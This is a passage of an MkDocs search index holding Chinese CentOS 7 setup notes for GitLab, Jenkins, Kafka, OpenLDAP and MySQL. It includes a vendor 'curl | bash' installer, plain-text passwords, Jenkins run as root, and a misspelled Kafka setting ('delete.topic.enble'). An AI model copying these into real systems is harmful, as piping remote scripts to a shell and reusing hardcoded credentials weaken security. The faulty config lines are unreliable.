\u5bc6\u7801\uff1aADMIN@110 \u5982\u679c\u56fd\u5916\u7684\u6e90\u592a\u6162\u53ef\u4ee5\u4f7f\u7528\u6e05\u534e\u5927\u5b66\u7684\u6e90\uff1ahttps://mirror.tuna.tsinghua.edu.cn/help/gitlab-ce/","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eGitlab"},{"location":"study_notes/gitlab/#_1","text":"","title":"\u8e29\u5751\u8bb0\u5f55"},{"location":"study_notes/gitlab/#_2","text":"\u5982\u679c8080\u7aef\u53e3\u88ab\u5360\u7528\uff0c\u89e3\u51b3\u65b9\u6848\u5982\u4e0b\uff1a \u4fee\u6539\u914d\u7f6e\u6587\u4ef6\uff1avim /etc/gitlab/gitlab.rb unicorn['listen'] = 'localhost' # unicorn['port'] = 8080 unicorn['port'] = 8082 \u4fee\u6539\u76d1\u542c\u6587\u4ef6\uff1avim /var/opt/gitlab/gitlab-rails/etc/unicorn.rb # listen 127.0.0.1:8080 , :tcp_nopush = true listen 127.0.0.1:8082 , :tcp_nopush = true \u91cd\u542f\u670d\u52a1\uff1agitlab-ctl restart","title":"\u7aef\u53e3\u88ab\u5360\u7528"},{"location":"study_notes/gitlab/#centos7gitlab-runner","text":"# \u6dfb\u52a0package curl -L https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.rpm.sh | bash # \u5b89\u88c5 yum install gitlab-runner.x86_64 -y \u6e05\u534e\u5927\u5b66\u7b49\u6e90\uff1ahttps://mirror.tuna.tsinghua.edu.cn/help/gitlab-runner/","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eGitlab-Runner"},{"location":"study_notes/gitlab/#gitlab-runner","text":"\u6ce8\u518crunner\uff1a\u5728gitlab\u9879\u76ee\u7684 settings \u4e2d\u627e\u5230 CI/CD \uff0c\u6253\u5f00 Runner \uff0c\u627e\u5230 Set up specific Runner manually gitlab-runner register","title":"Gitlab-Runner\u4f7f\u7528"},{"location":"study_notes/gitlab/#_3","text":"\u5b89\u88c5\u8c03\u8bd5gitlab/gitlab-ce\u5bb9\u5668\u65f6\u9047\u5230\u7684502","title":"\u53c2\u8003\u8d44\u6599"},{"location":"study_notes/jenkins/","text":"Jenkins\u6301\u7eed\u96c6\u6210\u5de5\u5177 Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eJenkins # \u5b89\u88c5java yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u4e0b\u8f7dJenkins wget https://pkg.jenkins.io/redhat-stable/jenkins-2.176.2-1.1.noarch.rpm # \u5b89\u88c5Jenkins rpm -ivh jenkins-2.176.2-1.1.noarch.rpm \u914d\u7f6eJenkins vim /etc/sysconfig/jenkins JENKINS_USER= root # \u8fd9\u4e48\u505a\u4ec5\u9650\u4e8e\u6d4b\u8bd5\u73af\u5883\uff0c\u4e3a\u4e86\u51fa\u73b0\u8c03\u8bd5\u5404\u79cd\u6743\u9650\u95ee\u9898\uff1b\u751f\u4ea7\u4e0d\u5141\u8bb8\u8fd9\u4e48\u505a # \u4fee\u6539\u76ee\u5f55\u6743\u9650 chown -R root:root /var/lib/jenkins chown -R root:root /var/cache/jenkins chown -R root:root /var/log/jenkins # \u542f\u52a8\u670d\u52a1 systemctl start jenkins.service # \u5bc6\u7801\u6587\u4ef6 cat /var/lib/jenkins/secrets/initialAdminPassword \u8bbf\u95ee8080\u7aef\u53e3 http://10.10.10.14:8080","title":"Jenkins\u6301\u7eed\u96c6\u6210\u5de5\u5177"},{"location":"study_notes/jenkins/#jenkins","text":"","title":"Jenkins\u6301\u7eed\u96c6\u6210\u5de5\u5177"},{"location":"study_notes/jenkins/#centos7jenkins","text":"# \u5b89\u88c5java yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u4e0b\u8f7dJenkins wget https://pkg.jenkins.io/redhat-stable/jenkins-2.176.2-1.1.noarch.rpm # \u5b89\u88c5Jenkins rpm -ivh jenkins-2.176.2-1.1.noarch.rpm","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eJenkins"},{"location":"study_notes/jenkins/#jenkins_1","text":"vim /etc/sysconfig/jenkins JENKINS_USER= root # \u8fd9\u4e48\u505a\u4ec5\u9650\u4e8e\u6d4b\u8bd5\u73af\u5883\uff0c\u4e3a\u4e86\u51fa\u73b0\u8c03\u8bd5\u5404\u79cd\u6743\u9650\u95ee\u9898\uff1b\u751f\u4ea7\u4e0d\u5141\u8bb8\u8fd9\u4e48\u505a # \u4fee\u6539\u76ee\u5f55\u6743\u9650 chown -R root:root /var/lib/jenkins chown -R root:root /var/cache/jenkins chown -R root:root /var/log/jenkins # \u542f\u52a8\u670d\u52a1 systemctl start jenkins.service # \u5bc6\u7801\u6587\u4ef6 cat /var/lib/jenkins/secrets/initialAdminPassword \u8bbf\u95ee8080\u7aef\u53e3 http://10.10.10.14:8080","title":"\u914d\u7f6eJenkins"},{"location":"study_notes/kafka/","text":"Kafka\u77e5\u8bc6\u4f53\u7cfb Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eKafka # yum\u5b89\u88c5java\u73af\u5883 # \u4e0b\u8f7d\u5e76\u89e3\u538bKafka wget http://mirror.bit.edu.cn/apache/kafka/2.3.0/kafka_2.11-2.3.0.tgz tar -xf kafka_2.11-2.3.0.tgz # \u79fb\u52a8\u5230\u5408\u7406\u4f4d\u7f6e mv kafka_2.11-2.3.0 /opt/kafka2.11 # \u914d\u7f6e\u7cfb\u7edf\u73af\u5883\u53d8\u91cf echo export KAFKA_HOME=/opt/kafka2.11 /etc/profile echo export PATH=$PATH:$KAFKA_HOME/bin /etc/profile source /etc/profile # \u6d4b\u8bd5Kafka\uff0c\u4e00\u5b9a\u8981\u4f18\u5148\u542f\u52a8Zookeeper # \u6211\u8fd9\u91cc10.10.10.18:2181\u7aef\u53e3\u4e0a\u662f\u6211\u7684Zookeeper\uff0c\u4e5f\u53ef\u4ee5\u53c2\u89c1\u4e0b\u9762\u7684\u914d\u7f6e\u6587\u4ef6 kafka-server-start.sh -daemon /opt/kafka2.11/config/server.properties # \u67e5\u770b\u662f\u5426\u542f\u52a8\u6210\u529f jps -m \u914d\u7f6eKafka vim /opt/kafka2.11/config/server.properties # \u8282\u70b9\u540d\u79f0 broker.id=0 # \u7ed1\u5b9a\u5730\u5740 listeners=PLAINTEXT://PLAINTEXT:9092 # \u5f53kafka\u5728docker\u6216\u8005\u865a\u62df\u673a\u4e2d\u65f6\uff0c\u9700\u8981\u4f7f\u7528\u4ee5\u4e0b\u53c2\u6570 advertised.listeners=PLAINTEXT://kafka-server:9092 # \u53d1\u9001\u7f13\u5b58\u5b57\u8282\u6570 socket.send.buffer.bytes=102400 # \u63a5\u6536\u7f13\u5b58\u5b57\u8282\u6570 socket.receive.buffer.bytes=102400 # \u6700\u5927\u8bf7\u6c42\u5b57\u8282\u6570\uff0c\u4fdd\u62a4OOM socket.request.max.bytes=104857600 # \u65e5\u5fd7\u76ee\u5f55 log.dirs=/tmp/kafka-logs # \u9ed8\u8ba4\u5206\u533a\u6570 num.partitions=1 # zookeeper\u5730\u5740 zookeeper.connect=10.10.10.19:2181 # zookeeper\u8fde\u63a5\u8d85\u65f6\u65f6\u95f4\uff0c\u5355\u4f4d\u6beb\u79d2 zookeeper.connection.timeout.ms=6000 \u5355\u673a\u7248Kafka \u5728\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u542f\u52a8\u4e00\u6b21\u5373\u53ef\u3002 \u96c6\u7fa4\u7248Kafka \u5355\u8282\u70b9\uff0c\u591aBroker \u5728\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u542f\u52a8\u591a\u6b21Kafka\uff0c\u6ca1\u6b21\u542f\u52a8\u52a0\u8f7d\u7684\u914d\u7f6e\u6587\u4ef6\u9700\u8981\u4e0d\u4e00\u81f4\uff0c\u5e76\u4e14\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684broker_id\u7684\u503c\u4e5f\u9700\u8981\u4e0d\u4e00\u81f4\u4e14\u6bcf\u4e2a\u503c\u552f\u4e00\u3002 kafka-server-start.sh -daemon /opt/kafka2.11/config/server_1.properties # \u5bf9\u5e94broker=1 kafka-server-start.sh -daemon /opt/kafka2.11/config/server_2.properties # \u5bf9\u5e94broker=2 \u591a\u8282\u70b9\uff0c\u591aBroker \u5728\u591a\u53f0\u670d\u52a1\u5668\u542f\u52a8\u5355\u4e2abroker\uff1b\u5728\u591a\u53f0\u670d\u52a1\u5668\u4e0a\u542f\u52a8\u591a\u4e2abroker\u3002 \u6e05\u7406Kafka\u65e5\u5fd7 \u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6709\u53c2\u6570\u53ef\u4ee5\u8fdb\u884c\u63a7\u5236\uff1avim /opt/kafka2.11/config/server.properties log.retention.hours=1 # \u65e5\u5fd7\u4fdd\u7559\u65f6\u95f4(h) log.retention.minutes=60 # \u65e5\u5fd7\u4fdd\u7559\u65f6\u95f4(m) log.retention.ms=3600000 # \u65e5\u5fd7\u4fdd\u7559\u65f6\u95f4(s) # \u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u5b83\u914d\u7f6e log.retention.bytes=1073741824 # \u65e5\u5fd7\u4fdd\u7559\u5927\u5c0f(bytes) \u4f7f\u7528Kafka \u5907\u6ce8 \u547d\u4ee4 \u521b\u5efatopic kafka-topics.sh --zookeeper 10.10.10.19:2181 --create --replication-factor 1 --partitions 1 --topic topic_name \u5217\u4e3etopic kafka-topics.sh --zookeeper 10.10.10.19:2181 --list \u67e5\u770btopic\u8be6\u60c5 kafka-topics.sh --zookeeper 10.10.10.19:2181 --describe --topic topic_name \u4fee\u6539topic\u5206\u533a kafka-topics.sh --zookeeper 10.10.10.19:2181 --alter --partitions 20 --topic topic_name \u5220\u9664topic kafka-topics.sh --zookeeper 10.10.10.19:2181 --delete --topic topic_name \u542f\u52a8\u6d88\u8d39\u8005 kafka-console-consumer.sh --zookeeper 10.10.10.19:2181 --topic topic_name \u542f\u52a8\u751f\u4ea7\u8005 kafka-console-producer.sh --broker-list 10.10.10.19:9092 --topic topic_name \u6307\u5b9a\u6d88\u8d39\u8005\u4ece\u5934\u6d88\u8d39 --from-beginning \u8e29\u5751 \u5220\u9664topic\u65f6\u62a5\u9519 Note: This will have no impact if delete.topic.enable is not set to true. \u89e3\u51b3\u65b9\u6848\uff1a\u4fee\u6539\u914d\u7f6e # vim /opt/kafka2.11/config/server.properties delete.topic.enble=true","title":"Kafka\u77e5\u8bc6\u4f53\u7cfb"},{"location":"study_notes/kafka/#kafka","text":"","title":"Kafka\u77e5\u8bc6\u4f53\u7cfb"},{"location":"study_notes/kafka/#centos7kafka","text":"# yum\u5b89\u88c5java\u73af\u5883 # \u4e0b\u8f7d\u5e76\u89e3\u538bKafka wget http://mirror.bit.edu.cn/apache/kafka/2.3.0/kafka_2.11-2.3.0.tgz tar -xf kafka_2.11-2.3.0.tgz # \u79fb\u52a8\u5230\u5408\u7406\u4f4d\u7f6e mv kafka_2.11-2.3.0 /opt/kafka2.11 # \u914d\u7f6e\u7cfb\u7edf\u73af\u5883\u53d8\u91cf echo export KAFKA_HOME=/opt/kafka2.11 /etc/profile echo export PATH=$PATH:$KAFKA_HOME/bin /etc/profile source /etc/profile # \u6d4b\u8bd5Kafka\uff0c\u4e00\u5b9a\u8981\u4f18\u5148\u542f\u52a8Zookeeper # \u6211\u8fd9\u91cc10.10.10.18:2181\u7aef\u53e3\u4e0a\u662f\u6211\u7684Zookeeper\uff0c\u4e5f\u53ef\u4ee5\u53c2\u89c1\u4e0b\u9762\u7684\u914d\u7f6e\u6587\u4ef6 kafka-server-start.sh -daemon /opt/kafka2.11/config/server.properties # \u67e5\u770b\u662f\u5426\u542f\u52a8\u6210\u529f jps -m","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eKafka"},{"location":"study_notes/kafka/#kafka_1","text":"vim /opt/kafka2.11/config/server.properties # \u8282\u70b9\u540d\u79f0 broker.id=0 # \u7ed1\u5b9a\u5730\u5740 listeners=PLAINTEXT://PLAINTEXT:9092 # \u5f53kafka\u5728docker\u6216\u8005\u865a\u62df\u673a\u4e2d\u65f6\uff0c\u9700\u8981\u4f7f\u7528\u4ee5\u4e0b\u53c2\u6570 advertised.listeners=PLAINTEXT://kafka-server:9092 # \u53d1\u9001\u7f13\u5b58\u5b57\u8282\u6570 socket.send.buffer.bytes=102400 # \u63a5\u6536\u7f13\u5b58\u5b57\u8282\u6570 socket.receive.buffer.bytes=102400 # \u6700\u5927\u8bf7\u6c42\u5b57\u8282\u6570\uff0c\u4fdd\u62a4OOM socket.request.max.bytes=104857600 # \u65e5\u5fd7\u76ee\u5f55 log.dirs=/tmp/kafka-logs # \u9ed8\u8ba4\u5206\u533a\u6570 num.partitions=1 # zookeeper\u5730\u5740 zookeeper.connect=10.10.10.19:2181 # zookeeper\u8fde\u63a5\u8d85\u65f6\u65f6\u95f4\uff0c\u5355\u4f4d\u6beb\u79d2 zookeeper.connection.timeout.ms=6000","title":"\u914d\u7f6eKafka"},{"location":"study_notes/kafka/#kafka_2","text":"\u5728\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u542f\u52a8\u4e00\u6b21\u5373\u53ef\u3002","title":"\u5355\u673a\u7248Kafka"},{"location":"study_notes/kafka/#kafka_3","text":"\u5355\u8282\u70b9\uff0c\u591aBroker \u5728\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u542f\u52a8\u591a\u6b21Kafka\uff0c\u6ca1\u6b21\u542f\u52a8\u52a0\u8f7d\u7684\u914d\u7f6e\u6587\u4ef6\u9700\u8981\u4e0d\u4e00\u81f4\uff0c\u5e76\u4e14\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684broker_id\u7684\u503c\u4e5f\u9700\u8981\u4e0d\u4e00\u81f4\u4e14\u6bcf\u4e2a\u503c\u552f\u4e00\u3002 kafka-server-start.sh -daemon /opt/kafka2.11/config/server_1.properties # \u5bf9\u5e94broker=1 kafka-server-start.sh -daemon /opt/kafka2.11/config/server_2.properties # \u5bf9\u5e94broker=2 \u591a\u8282\u70b9\uff0c\u591aBroker \u5728\u591a\u53f0\u670d\u52a1\u5668\u542f\u52a8\u5355\u4e2abroker\uff1b\u5728\u591a\u53f0\u670d\u52a1\u5668\u4e0a\u542f\u52a8\u591a\u4e2abroker\u3002","title":"\u96c6\u7fa4\u7248Kafka"},{"location":"study_notes/kafka/#kafka_4","text":"\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6709\u53c2\u6570\u53ef\u4ee5\u8fdb\u884c\u63a7\u5236\uff1avim /opt/kafka2.11/config/server.properties log.retention.hours=1 # \u65e5\u5fd7\u4fdd\u7559\u65f6\u95f4(h) log.retention.minutes=60 # \u65e5\u5fd7\u4fdd\u7559\u65f6\u95f4(m) log.retention.ms=3600000 # \u65e5\u5fd7\u4fdd\u7559\u65f6\u95f4(s) # \u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u5b83\u914d\u7f6e log.retention.bytes=1073741824 # \u65e5\u5fd7\u4fdd\u7559\u5927\u5c0f(bytes)","title":"\u6e05\u7406Kafka\u65e5\u5fd7"},{"location":"study_notes/kafka/#kafka_5","text":"\u5907\u6ce8 \u547d\u4ee4 \u521b\u5efatopic kafka-topics.sh --zookeeper 10.10.10.19:2181 --create --replication-factor 1 --partitions 1 --topic topic_name \u5217\u4e3etopic kafka-topics.sh --zookeeper 10.10.10.19:2181 --list \u67e5\u770btopic\u8be6\u60c5 kafka-topics.sh --zookeeper 10.10.10.19:2181 --describe --topic topic_name \u4fee\u6539topic\u5206\u533a kafka-topics.sh --zookeeper 10.10.10.19:2181 --alter --partitions 20 --topic topic_name \u5220\u9664topic kafka-topics.sh --zookeeper 10.10.10.19:2181 --delete --topic topic_name \u542f\u52a8\u6d88\u8d39\u8005 kafka-console-consumer.sh --zookeeper 10.10.10.19:2181 --topic topic_name \u542f\u52a8\u751f\u4ea7\u8005 kafka-console-producer.sh --broker-list 10.10.10.19:9092 --topic topic_name \u6307\u5b9a\u6d88\u8d39\u8005\u4ece\u5934\u6d88\u8d39 --from-beginning","title":"\u4f7f\u7528Kafka"},{"location":"study_notes/kafka/#_1","text":"","title":"\u8e29\u5751"},{"location":"study_notes/kafka/#topic","text":"Note: This will have no impact if delete.topic.enable is not set to true. \u89e3\u51b3\u65b9\u6848\uff1a\u4fee\u6539\u914d\u7f6e # vim /opt/kafka2.11/config/server.properties delete.topic.enble=true","title":"\u5220\u9664topic\u65f6\u62a5\u9519"},{"location":"study_notes/ldap/","text":"LDAP\u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae Lightweight Directory Access Protocol \u8f7b\u91cf\u7ea7\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eLDAP # \u5b89\u88c5OpenLDAP yum install -y openldap.x86_64 openldap-clients.x86_64 openldap-servers.x86_64 openldap-devel.x86_64 migrationtools.noarch compat-openldap.x86_64 \u914d\u7f6eLDAP Server vim /etc/openldap/slapd.d/cn\\=config/olcDatabase\\={2}hdb.ldif # \u4fee\u6539\u7b2c8\u30019\u884c\uff0c\u6dfb\u52a0\u7b2c10\u884c # olcSuffix: dc=bloodzer0,dc=com olcSuffix: dc=my-domain,dc=com # olcRootDN: cn=Manager,dc=my-domain,dc=com olcRootDN: cn=Manager,dc=bloodzer0,dc=com olcRootPW: bloodzer0 \u914d\u7f6eMonitoring Database vim /etc/openldap/slapd.d/cn\\=config/olcDatabase\\={1}monitor.ldif # \u4fee\u6539\u7b2c6\u30017\u884c # olcAccess: {0}to * by dn.base= gidNumber=0+uidNumber=0,cn=peercred,cn=extern # al,cn=auth read by dn.base= cn=Manager,dc=my-domain,dc=com read by * none olcAccess: {0}to * by dn.base= gidNumber=0+uidNumber=0,cn=peercred,cn=extern al,cn=auth read by dn.base= cn=Manager,dc=bloodzer0,dc=com read by * none \u914d\u7f6eLDAP\u6570\u636e\u5e93 cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG chown -R ldap.ldap /var/lib/ldap/ \u6d4b\u8bd5LDAP slaptest -u \u542f\u52a8\u670d\u52a1 systemctl enable slapd.service systemctl start slapd.service \u5bfc\u5165schemas ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/cosine.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/nis.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/collective.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/corba.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/core.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/duaconf.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/dyngroup.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/inetorgperson.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/java.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/misc.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/openldap.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/pmi.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/ppolicy.ldif \u914d\u7f6ebasedomain vim /usr/share/migrationtools/migrate_common.ph # \u4fee\u6539\u7b2c71\u300174\u300190\u4e09\u884c\u6587\u4ef6 $DEFAULT_MAIL_DOMAIN = bloodzer0.com ; $DEFAULT_BASE = dc=bloodzer0,dc=com ; $EXTENDED_SCHEMA = 1; /usr/share/migrationtools/migrate_base.pl /etc/openldap/basedomain.ldif # \u5bfc\u5165basedomain\u6587\u4ef6 ldapadd -x -D cn=Manager,dc=bloodzer0,dc=com -W -f /etc/openldap/basedomain.ldif # \u8981\u6c42\u8f93\u5165olcRootPW\u7684\u5bc6\u7801 \u914d\u7f6ephpldapadmin # \u5b89\u88c5phpldapadmin yum install epel-release -y yum install phpldapadmin.noarch -y systemctl enable httpd.service systemctl start httpd.service \u4fee\u6539httpd\u914d\u7f6e\uff1avim /etc/httpd/conf.d/phpldapadmin.conf # \u6dfb\u52a0Require all granted # \u8bbf\u95eehttp://10.10.10.14/phpldapadmin/cmd.php \u4fee\u6539phpldapadmin\u914d\u7f6e\uff1avim /etc/phpldapadmin/config.php # \u6ce8\u91ca398\uff0c\u53d6\u6d88\u6ce8\u91ca397 \u767b\u5f55LDAP\uff0c \u8d26\u53f7\uff1acn=Manager,dc=bloodzer0,dc=com \u5bc6\u7801\uff1aolcRootPW\u7684\u5bc6\u7801 \u914d\u7f6e\u5b8c\u6210\u3002","title":"LDAP\u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae"},{"location":"study_notes/ldap/#ldap","text":"Lightweight Directory Access Protocol \u8f7b\u91cf\u7ea7\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae","title":"LDAP\u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae"},{"location":"study_notes/ldap/#centos7ldap","text":"# \u5b89\u88c5OpenLDAP yum install -y openldap.x86_64 openldap-clients.x86_64 openldap-servers.x86_64 openldap-devel.x86_64 migrationtools.noarch compat-openldap.x86_64","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eLDAP"},{"location":"study_notes/ldap/#ldap-server","text":"vim /etc/openldap/slapd.d/cn\\=config/olcDatabase\\={2}hdb.ldif # \u4fee\u6539\u7b2c8\u30019\u884c\uff0c\u6dfb\u52a0\u7b2c10\u884c # olcSuffix: dc=bloodzer0,dc=com olcSuffix: dc=my-domain,dc=com # olcRootDN: cn=Manager,dc=my-domain,dc=com olcRootDN: cn=Manager,dc=bloodzer0,dc=com olcRootPW: bloodzer0","title":"\u914d\u7f6eLDAP Server"},{"location":"study_notes/ldap/#monitoring-database","text":"vim /etc/openldap/slapd.d/cn\\=config/olcDatabase\\={1}monitor.ldif # \u4fee\u6539\u7b2c6\u30017\u884c # olcAccess: {0}to * by dn.base= gidNumber=0+uidNumber=0,cn=peercred,cn=extern # al,cn=auth read by dn.base= cn=Manager,dc=my-domain,dc=com read by * none olcAccess: {0}to * by dn.base= gidNumber=0+uidNumber=0,cn=peercred,cn=extern al,cn=auth read by dn.base= cn=Manager,dc=bloodzer0,dc=com read by * none","title":"\u914d\u7f6eMonitoring Database"},{"location":"study_notes/ldap/#ldap_1","text":"cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG chown -R ldap.ldap /var/lib/ldap/","title":"\u914d\u7f6eLDAP\u6570\u636e\u5e93"},{"location":"study_notes/ldap/#ldap_2","text":"slaptest -u","title":"\u6d4b\u8bd5LDAP"},{"location":"study_notes/ldap/#_1","text":"systemctl enable slapd.service systemctl start slapd.service","title":"\u542f\u52a8\u670d\u52a1"},{"location":"study_notes/ldap/#schemas","text":"ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/cosine.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/nis.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/collective.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/corba.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/core.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/duaconf.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/dyngroup.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/inetorgperson.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/java.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/misc.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/openldap.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/pmi.ldif ldapadd -Y EXTERNAL -H ldapi:/// -D cn=config -f /etc/openldap/schema/ppolicy.ldif","title":"\u5bfc\u5165schemas"},{"location":"study_notes/ldap/#basedomain","text":"vim /usr/share/migrationtools/migrate_common.ph # \u4fee\u6539\u7b2c71\u300174\u300190\u4e09\u884c\u6587\u4ef6 $DEFAULT_MAIL_DOMAIN = bloodzer0.com ; $DEFAULT_BASE = dc=bloodzer0,dc=com ; $EXTENDED_SCHEMA = 1; /usr/share/migrationtools/migrate_base.pl /etc/openldap/basedomain.ldif # \u5bfc\u5165basedomain\u6587\u4ef6 ldapadd -x -D cn=Manager,dc=bloodzer0,dc=com -W -f /etc/openldap/basedomain.ldif # \u8981\u6c42\u8f93\u5165olcRootPW\u7684\u5bc6\u7801","title":"\u914d\u7f6ebasedomain"},{"location":"study_notes/ldap/#phpldapadmin","text":"# \u5b89\u88c5phpldapadmin yum install epel-release -y yum install phpldapadmin.noarch -y systemctl enable httpd.service systemctl start httpd.service \u4fee\u6539httpd\u914d\u7f6e\uff1avim /etc/httpd/conf.d/phpldapadmin.conf # \u6dfb\u52a0Require all granted # \u8bbf\u95eehttp://10.10.10.14/phpldapadmin/cmd.php \u4fee\u6539phpldapadmin\u914d\u7f6e\uff1avim /etc/phpldapadmin/config.php # \u6ce8\u91ca398\uff0c\u53d6\u6d88\u6ce8\u91ca397 \u767b\u5f55LDAP\uff0c \u8d26\u53f7\uff1acn=Manager,dc=bloodzer0,dc=com \u5bc6\u7801\uff1aolcRootPW\u7684\u5bc6\u7801 \u914d\u7f6e\u5b8c\u6210\u3002","title":"\u914d\u7f6ephpldapadmin"},{"location":"study_notes/mkdocs/","text":"MKDocs\u6587\u6863\u7ba1\u7406\u5de5\u5177 \u5b98\u7f51\u5730\u5740 site_name: 'ossa' site_description: '\u5f00\u6e90\u5b89\u5168\u67b6\u6784' site_author: 'bloodzer0' site_url: https://bloodzer0.github.io/ossa/ copyright: 'Copyright 2018-2099' repo_name: 'bloodzer0/ossa' repo_url: 'https://github.com/bloodzer0/ossa' edit_uri: '' theme: name: 'material'","title":"MKDocs\u6587\u6863\u7ba1\u7406\u5de5\u5177"},{"location":"study_notes/mkdocs/#mkdocs","text":"\u5b98\u7f51\u5730\u5740 site_name: 'ossa' site_description: '\u5f00\u6e90\u5b89\u5168\u67b6\u6784' site_author: 'bloodzer0' site_url: https://bloodzer0.github.io/ossa/ copyright: 'Copyright 2018-2099' repo_name: 'bloodzer0/ossa' repo_url: 'https://github.com/bloodzer0/ossa' edit_uri: '' theme: name: 'material'","title":"MKDocs\u6587\u6863\u7ba1\u7406\u5de5\u5177"},{"location":"study_notes/mysql/","text":"MySQL\u77e5\u8bc6\u4f53\u7cfb Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eMySQL MariaDB\u7684\u5b89\u88c5\u4e0e\u914d\u7f6e yum install mariadb.x86_64 mariadb-server.x86_64 mariadb-devel.x86_64 -y systemctl enable mariadb.service systemctl start mariadb.service # \u521d\u59cb\u5316\u914d\u7f6e mysql_secure_installation MySQL\u7684\u5b89\u88c5\u4e0e\u914d\u7f6e # \u4e0b\u8f7d\u6e90 wget https://repo.mysql.com//mysql80-community-release-el7-3.noarch.rpm # \u5982\u679c\u592a\u6162\u5c31\u7528\u4e2d\u79d1\u5927\u7684\u6e90 wget http://mirrors.ustc.edu.cn/mysql-repo/mysql80-community-release-el7.rpm # \u5b89\u88c5\u6e90 rpm -ivh mysql80-community-release-el7-3.noarch.rpm # \u5b89\u88c5\u6570\u636e\u5e93 yum install mysql-community-server.x86_64 -y # \u542f\u52a8\u670d\u52a1 systemctl start mysqld.service # \u67e5\u770b\u6570\u636e\u5e93\u521d\u59cb\u5bc6\u7801 grep password /var/log/mysqld.log # \u4fee\u6539\u6570\u636e\u5e93\u5bc6\u7801 ALTER USER 'root'@'localhost' IDENTIFIED BY 'BloodZero@0';","title":"MySQL\u77e5\u8bc6\u4f53\u7cfb"},{"location":"study_notes/mysql/#mysql","text":"","title":"MySQL\u77e5\u8bc6\u4f53\u7cfb"},{"location":"study_notes/mysql/#centos7mysql","text":"","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eMySQL"},{"location":"study_notes/mysql/#mariadb","text":"yum install mariadb.x86_64 mariadb-server.x86_64 mariadb-devel.x86_64 -y systemctl enable mariadb.service systemctl start mariadb.service # \u521d\u59cb\u5316\u914d\u7f6e mysql_secure_installation","title":"MariaDB\u7684\u5b89\u88c5\u4e0e\u914d\u7f6e"},{"location":"study_notes/mysql/#mysql_1","text":"# \u4e0b\u8f7d\u6e90 wget https://repo.mysql.com//mysql80-community-release-el7-3.noarch.rpm # \u5982\u679c\u592a\u6162\u5c31\u7528\u4e2d\u79d1\u5927\u7684\u6e90 wget http://mirrors.ustc.edu.cn/mysql-repo/mysql80-community-release-el7.rpm # \u5b89\u88c5\u6e90 rpm -ivh mysql80-community-release-el7-3.noarch.rpm # \u5b89\u88c5\u6570\u636e\u5e93 yum install mysql-community-server.x86_64 -y # \u542f\u52a8\u670d\u52a1 systemctl start mysqld.service # \u67e5\u770b\u6570\u636e\u5e93\u521d\u59cb\u5bc6\u7801 grep password /var/log/mysqld.log # \u4fee\u6539\u6570\u636e\u5e93\u5bc6\u7801 